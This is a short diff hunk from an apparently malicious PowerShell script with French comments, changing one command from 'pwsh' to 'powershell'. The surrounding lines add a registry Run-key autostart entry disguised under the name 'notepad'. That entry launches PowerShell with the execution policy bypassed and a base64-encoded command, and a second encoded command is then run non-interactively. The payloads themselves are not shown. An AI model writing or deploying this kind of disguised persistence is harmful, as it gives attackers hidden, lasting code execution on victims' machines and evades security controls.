@@ -8,4 +8,4 @@ $c2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($comman
 
 # Création de la nouvelle valeur dans la clé de Registre "Run"
 New-ItemProperty -Path $regPath -Name "notepad" -Value "powershell.exe -ExecutionPolicy Bypass -EncodedCommand '$c1'" -PropertyType String -Force | Out-Null
-pwsh -NoProfile -NonInteractive -Exec Bypass -EncodedCommand "$c2"
+powershell -NoProfile -NonInteractive -Exec Bypass -EncodedCommand "$c2"
